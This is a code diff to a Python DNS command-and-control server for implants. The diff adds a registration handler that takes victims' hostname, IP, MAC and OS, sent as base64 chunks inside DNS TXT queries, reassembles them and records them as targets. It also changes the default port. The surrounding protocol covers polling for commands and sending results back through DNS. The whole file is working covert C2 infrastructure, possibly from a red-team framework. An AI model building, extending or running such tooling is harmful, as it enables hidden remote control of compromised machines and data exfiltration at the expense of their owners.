@@ -1,6 +1,6 @@
 """DNS C2 channel server.
 
-Protocol (UDP on port 5353 by default):
+Protocol (UDP on port 15353 by default):
 
   POLL (implant → server):
     Query type : TXT
@@ -19,6 +19,16 @@ Protocol (UDP on port 5353 by default):
                  whether a command was delivered.  It always reads
                  "sleep" and "jitter" to compute its next check-in delay:
                    delay = sleep * uniform(1 - jitter, 1 + jitter)
+
+  REGISTER (implant → server):
+    Query type : TXT
+    Query name : {b64_chunk}.{chunk_idx}.{total_chunks}.reg.{C2_DNS_DOMAIN}
+    Response   : Intermediate chunks: TXT "OK"
+                 Final chunk: TXT record with base64-encoded JSON:
+                   {"target_id": "<uuid>"}
+    Notes      : Registration data (hostname, ip, mac, os) is JSON-encoded,
+                 base64url-encoded, then split into ≤ 50-char chunks.
+                 The server reassembles and registers on the final chunk.
 
   RESULT CHUNK (implant → server):
     Query type : TXT
@@ -55,6 +65,10 @@ C2_DOMAIN: str = os.getenv("C2_DNS_DOMAIN", "c2.local")
 _result_buffer: dict[str, dict[int, str]] = {}
 _result_lock = threading.Lock()
 
+# In-memory assembly buffer for registration chunks: {client_addr: {chunk_idx: b64_chunk_str}}
+_reg_buffer: dict[str, dict[int, str]] = {}
+_reg_lock = threading.Lock()
+
 
 class _DNSHandler(socketserver.BaseRequestHandler):
     """One instance per incoming UDP datagram."""
@@ -88,6 +102,16 @@ class _DNSHandler(socketserver.BaseRequestHandler):
             target_id = ".".join(parts[:-1])
             self._handle_poll(request, reply, target_id)
 
+        elif action == "reg" and len(parts) >= 3:
+            # {b64_chunk}.{chunk_idx}.{total_chunks}.reg
+            try:
+                total = int(parts[-2])
+                idx = int(parts[-3])
+                b64_chunk = "".join(parts[:-3])
+                self._handle_reg_chunk(request, reply, idx, total, b64_chunk)
+            except (ValueError, IndexError):
+                pass
+
         elif action == "res" and len(parts) >= 4:
             # {b64_chunk}.{chunk_idx}.{total_chunks}.{cmd_id}.res
             cmd_id = parts[-2]
@@ -100,6 +124,85 @@ class _DNSHandler(socketserver.BaseRequestHandler):
                 pass
 
         sock.sendto(reply.pack(), self.client_address)
+
+    # ── Registration handler ────────────────────────────────────────────
+
+    def _handle_reg_chunk(
+        self,
+        request: DNSRecord,
+        reply,
+        idx: int,
+        total: int,
+        b64_chunk: str,
+    ) -> None:
+        client_key = f"{self.client_address[0]}:{self.client_address[1]}"
+
+        with _reg_lock:
+            _reg_buffer.setdefault(client_key, {})[idx] = b64_chunk
+
+            if len(_reg_buffer[client_key]) < total:
+                # Still waiting for more chunks — ACK this one
+                reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT([b"OK"])))
+                return
+
+            # All chunks received — reassemble
+            assembled_b64 = "".join(
+                _reg_buffer[client_key].get(i, "") for i in range(total)
+            )
+            del _reg_buffer[client_key]
+
+        try:
+            data = json.loads(base64.b64decode(assembled_b64 + "==").decode())
+        except Exception:
+            reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT([b"ERR"])))
+            return
+
+        # Register or re-register the target (mirrors agent_routes.register)
+        with Session(engine) as session:
+            mac = data.get("mac_address", "")
+            hostname = data.get("hostname", "")
+            ip_address = data.get("ip_address", "") or self.client_address[0]
+
+            existing = None
+            if mac:
+                existing = session.exec(
+                    select(Target).where(Target.mac_address == mac)
+                ).first()
+            elif hostname:
+                existing = session.exec(
+                    select(Target).where(
+                        Target.hostname == hostname,
+                        Target.ip_address == ip_address,
+                    )
+                ).first()
+
+            if existing:
+                existing.ip_address = ip_address or existing.ip_address
+                existing.os = data.get("os", "") or existing.os
+                existing.status = "active"
+                existing.communication_channel = "dns"
+                existing.last_seen = datetime.now(timezone.utc)
+                session.add(existing)
+                session.commit()
+                target_id = existing.id
+            else:
+                target = Target(
+                    hostname=hostname,
+                    ip_address=ip_address,
+                    mac_address=mac,
+                    os=data.get("os", ""),
+                    status="active",
+                    communication_channel="dns",
+                )
+                session.add(target)
+                session.commit()
+                session.refresh(target)
+                target_id = target.id
+
+        resp_json = json.dumps({"target_id": target_id})
+        resp_b64 = base64.b64encode(resp_json.encode()).decode()
+        chunks = [resp_b64[i: i + 255].encode() for i in range(0, len(resp_b64), 255)]
+        reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(chunks)))
 
     # ── Poll handler ──────────────────────────────────────────────────
 
@@ -191,7 +294,7 @@ class _DNSHandler(socketserver.BaseRequestHandler):
 # ── Internal UDP server wrapper ───────────────────────────────────────────────
 
 class _DNSServerInternal:
-    def __init__(self, host: str = "0.0.0.0", port: int = 5353) -> None:
+    def __init__(self, host: str = "0.0.0.0", port: int = 15353) -> None:
         self._server = UDPServer((host, port), _DNSHandler)
 
     def start(self) -> None:
@@ -207,7 +310,7 @@ class _DNSServerInternal:
 # ── Public-facing threaded wrapper ────────────────────────────────────────────
 
 class DNSServer(Server):
-    def __init__(self, host: str = "0.0.0.0", port: int = 5353) -> None:
+    def __init__(self, host: str = "0.0.0.0", port: int = 15353) -> None:
         super().__init__()
         self.__host = host
         self.__port = port
